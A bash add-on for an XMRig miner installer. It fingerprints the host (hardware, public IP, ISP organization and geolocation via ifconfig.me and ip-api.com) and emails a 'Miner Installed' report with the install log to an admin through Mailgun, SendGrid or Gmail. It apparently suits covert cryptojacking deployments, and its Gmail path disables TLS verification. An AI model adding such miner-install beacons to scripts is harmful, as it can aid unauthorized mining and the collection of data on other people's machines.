#!/bin/bash
# ==================== ADD TO END OF YOUR SETUP SCRIPT ====================
# This function collects system info (like bench.sh) and sends it via email
# along with the installation log

# ==================== CONFIGURATION ====================
# Set these at the beginning of your script:
# ADMIN_EMAIL="your-email@example.com"
# SMTP_METHOD="mailgun"  # or: sendgrid, gmail, local

# Mailgun (free tier: 5,000 emails/month)
MAILGUN_API_KEY="YOUR_MAILGUN_API_KEY"
MAILGUN_DOMAIN="YOUR_DOMAIN.mailgun.org"

# SendGrid (free tier: 100 emails/day)
SENDGRID_API_KEY="YOUR_SENDGRID_API_KEY"

# Gmail (use app password)
GMAIL_ADDRESS="your-gmail@gmail.com"
GMAIL_APP_PASSWORD="your-app-password"

# ==================== SYSTEM INFO COLLECTOR ====================

collect_system_info() {
    local output="/tmp/system_bench_$$"
    
    cat > "$output" << 'BENCH_HEADER'
-------------------- System Information Report -------------------
BENCH_HEADER
    
    echo " Version            : Installation Report v$(date +%Y-%m-%d)" >> "$output"
    echo " Timestamp          : $(date '+%Y-%m-%d %H:%M:%S %Z')" >> "$output"
    echo "----------------------------------------------------------------------" >> "$output"
    
    # CPU Info
    local cpu_model=$(grep -m1 "model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
    local cpu_cores=$(grep -c ^processor /proc/cpuinfo 2>/dev/null || echo "Unknown")
    local cpu_mhz=$(grep -m1 "cpu MHz" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
    local cpu_cache=$(grep -m1 "cache size" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "Unknown")
    
    echo " CPU Model          : $cpu_model" >> "$output"
    echo " CPU Cores          : $cpu_cores @ $cpu_mhz MHz" >> "$output"
    echo " CPU Cache          : $cpu_cache" >> "$output"
    
    # AES-NI & Virtualization
    if grep -q aes /proc/cpuinfo 2>/dev/null; then
        echo " AES-NI             : ✓ Enabled" >> "$output"
    else
        echo " AES-NI             : ✗ Disabled" >> "$output"
    fi
    
    if grep -qE 'vmx|svm' /proc/cpuinfo 2>/dev/null; then
        echo " VM-x/AMD-V         : ✓ Enabled" >> "$output"
    else
        echo " VM-x/AMD-V         : ✗ Disabled" >> "$output"
    fi
    
    # Disk
    local disk_info=$(df -h / 2>/dev/null | awk 'NR==2 {printf "%s (%s Used)", $2, $3}' || echo "Unknown")
    echo " Total Disk         : $disk_info" >> "$output"
    
    # RAM
    local ram_info=$(free -h 2>/dev/null | awk '/^Mem:/ {printf "%s (%s Used)", $2, $3}' || echo "Unknown")
    local swap_info=$(free -h 2>/dev/null | awk '/^Swap:/ {printf "%s (%s Used)", $2, $3}' || echo "Unknown")
    echo " Total RAM          : $ram_info" >> "$output"
    echo " Total Swap         : $swap_info" >> "$output"
    
    # Uptime & Load
    local uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')
    local load_avg=$(uptime 2>/dev/null | awk -F'load average:' '{print $2}' | xargs || echo "Unknown")
    echo " System Uptime      : $uptime_str" >> "$output"
    echo " Load Average       : $load_avg" >> "$output"
    
    # OS Info
    local os_name=$(grep "PRETTY_NAME" /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown Linux")
    local arch=$(uname -m 2>/dev/null || echo "Unknown")
    local kernel=$(uname -r 2>/dev/null || echo "Unknown")
    echo " OS                 : $os_name" >> "$output"
    echo " Arch               : $arch" >> "$output"
    echo " Kernel             : $kernel" >> "$output"
    
    # Network
    local tcp_cc=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null || echo "Unknown")
    echo " TCP Congestion Ctrl: $tcp_cc" >> "$output"
    
    # Virtualization
    local virt="Unknown"
    if command -v systemd-detect-virt >/dev/null 2>&1; then
        virt=$(systemd-detect-virt 2>/dev/null || echo "None")
        [ "$virt" = "none" ] && virt="Bare Metal"
    fi
    echo " Virtualization     : $virt" >> "$output"
    
    # IP Info
    local ipv4=$(curl -s4 --max-time 5 ifconfig.me 2>/dev/null || echo "Offline")
    local ipv6=$(curl -s6 --max-time 5 ifconfig.me 2>/dev/null || echo "Offline")
    
    if [ "$ipv4" != "Offline" ]; then
        echo " IPv4/IPv6          : ✓ Online / $([ "$ipv6" != "Offline" ] && echo "✓ Online" || echo "✗ Offline")" >> "$output"
    else
        echo " IPv4/IPv6          : ✗ Offline / ✗ Offline" >> "$output"
    fi
    
    # ISP Info (via ip-api.com)
    if [ "$ipv4" != "Offline" ]; then
        local isp_json=$(curl -s --max-time 5 "http://ip-api.com/json/$ipv4" 2>/dev/null)
        if [ -n "$isp_json" ]; then
            local org=$(echo "$isp_json" | grep -o '"org":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
            local city=$(echo "$isp_json" | grep -o '"city":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
            local country=$(echo "$isp_json" | grep -o '"countryCode":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
            local region=$(echo "$isp_json" | grep -o '"regionName":"[^"]*' | cut -d'"' -f4 || echo "Unknown")
            
            echo " Organization       : $org" >> "$output"
            echo " Location           : $city / $country" >> "$output"
            echo " Region             : $region" >> "$output"
        fi
    fi
    
    echo "----------------------------------------------------------------------" >> "$output"
    
    # Miner Info
    echo " Miner Type         : XMRig" >> "$output"
    echo " Wallet             : ${WALLET:0:10}...${WALLET: -10}" >> "$output"
    echo " Installation       : Completed at $(date '+%Y-%m-%d %H:%M:%S')" >> "$output"
    
    echo "----------------------------------------------------------------------" >> "$output"
    
    cat "$output"
    rm -f "$output"
}

# ==================== EMAIL SENDING FUNCTIONS ====================

send_via_mailgun() {
    local to="$1"
    local subject="$2"
    local body="$3"
    local attachment="$4"
    
    if [ -n "$attachment" ] && [ -f "$attachment" ]; then
        curl -s --user "api:$MAILGUN_API_KEY" \
            "https://api.mailgun.net/v3/$MAILGUN_DOMAIN/messages" \
            -F from="Miner Installation <noreply@$MAILGUN_DOMAIN>" \
            -F to="$to" \
            -F subject="$subject" \
            -F text="$body" \
            -F attachment="@$attachment" > /dev/null 2>&1
    else
        curl -s --user "api:$MAILGUN_API_KEY" \
            "https://api.mailgun.net/v3/$MAILGUN_DOMAIN/messages" \
            -F from="Miner Installation <noreply@$MAILGUN_DOMAIN>" \
            -F to="$to" \
            -F subject="$subject" \
            -F text="$body" > /dev/null 2>&1
    fi
    
    return $?
}

send_via_sendgrid() {
    local to="$1"
    local subject="$2"
    local body="$3"
    
    # SendGrid doesn't support attachments in simple API
    # Use web API v3
    
    curl -s -X POST "https://api.sendgrid.com/v3/mail/send" \
        -H "Authorization: Bearer $SENDGRID_API_KEY" \
        -H "Content-Type: application/json" \
        -d "{
            \"personalizations\": [{\"to\": [{\"email\": \"$to\"}]}],
            \"from\": {\"email\": \"noreply@yourdomain.com\", \"name\": \"Miner Installation\"},
            \"subject\": \"$subject\",
            \"content\": [{\"type\": \"text/plain\", \"value\": \"$body\"}]
        }" > /dev/null 2>&1
    
    return $?
}

send_via_gmail() {
    local to="$1"
    local subject="$2"
    local body="$3"
    
    # Use mailx or sendmail
    if command -v mailx >/dev/null 2>&1; then
        echo "$body" | mailx -s "$subject" \
            -S smtp="smtp://smtp.gmail.com:587" \
            -S smtp-use-starttls \
            -S smtp-auth=login \
            -S smtp-auth-user="$GMAIL_ADDRESS" \
            -S smtp-auth-password="$GMAIL_APP_PASSWORD" \
            -S ssl-verify=ignore \
            "$to" 2>/dev/null
        return $?
    else
        echo "[!] mailx not installed for Gmail sending"
        return 1
    fi
}

send_via_local() {
    local to="$1"
    local subject="$2"
    local body="$3"
    local attachment="$4"
    
    if command -v mail >/dev/null 2>&1; then
        if [ -n "$attachment" ] && [ -f "$attachment" ]; then
            echo "$body" | mail -s "$subject" -a "$attachment" "$to" 2>/dev/null
        else
            echo "$body" | mail -s "$subject" "$to" 2>/dev/null
        fi
        return $?
    else
        echo "[!] mail command not available"
        return 1
    fi
}

# ==================== MAIN SEND FUNCTION ====================

send_installation_report_email() {
    local admin_email="${ADMIN_EMAIL:-}"
    local log_file="${INSTALL_LOG:-/tmp/miner_install.log}"
    
    # Skip if no email configured
    if [ -z "$admin_email" ] || [ "$admin_email" = "your-email@example.com" ]; then
        echo "[*] No admin email configured - skipping email report"
        return 0
    fi
    
    echo ""
    echo "========================================"
    echo "SENDING INSTALLATION REPORT VIA EMAIL"
    echo "========================================"
    echo ""
    
    # Collect system info
    echo "[*] Collecting system information..."
    local system_info=$(collect_system_info)
    
    # Build email body
    local hostname=$(hostname)
    local subject="✅ Miner Installed - $hostname - $(date +%Y-%m-%d)"
    
    local body=$(cat << EOF
Miner installation completed successfully!

Hostname: $hostname
Timestamp: $(date '+%Y-%m-%d %H:%M:%S %Z')

$system_info

Installation log attached (if available).

EOF
)
    
    # Try to send email
    echo "[*] Sending email to: $admin_email"
    
    local smtp_method="${SMTP_METHOD:-mailgun}"
    local sent=false
    
    case "$smtp_method" in
        mailgun)
            if send_via_mailgun "$admin_email" "$subject" "$body" "$log_file"; then
                echo "[✓] Email sent successfully via Mailgun"
                sent=true
            else
                echo "[!] Failed to send via Mailgun"
            fi
            ;;
        sendgrid)
            if send_via_sendgrid "$admin_email" "$subject" "$body"; then
                echo "[✓] Email sent successfully via SendGrid"
                sent=true
            else
                echo "[!] Failed to send via SendGrid"
            fi
            ;;
        gmail)
            if send_via_gmail "$admin_email" "$subject" "$body"; then
                echo "[✓] Email sent successfully via Gmail"
                sent=true
            else
                echo "[!] Failed to send via Gmail"
            fi
            ;;
        local|mail)
            if send_via_local "$admin_email" "$subject" "$body" "$log_file"; then
                echo "[✓] Email sent successfully via local mail"
                sent=true
            else
                echo "[!] Failed to send via local mail"
            fi
            ;;
        *)
            echo "[!] Unknown SMTP method: $smtp_method"
            ;;
    esac
    
    if [ "$sent" = false ]; then
        echo ""
        echo "[!] Email sending failed. Report saved to: /tmp/system_report.txt"
        echo "$system_info" > /tmp/system_report.txt
        echo ""
        echo "You can manually send it:"
        echo "  cat /tmp/system_report.txt | mail -s 'Miner Report' $admin_email"
    fi
    
    echo ""
}

# ==================== USAGE ====================
# Add this at the END of your installation script:
#
# # Configure email
# ADMIN_EMAIL="your-email@example.com"
# SMTP_METHOD="mailgun"  # or sendgrid, gmail, local
# INSTALL_LOG="/var/log/miner_install.log"  # your log file path
#
# # Configure Mailgun (if using)
# MAILGUN_API_KEY="key-abc123..."
# MAILGUN_DOMAIN="mg.yourdomain.com"
#
# # Send report
# send_installation_report_email
#
# ==================== END OF SCRIPT ====================
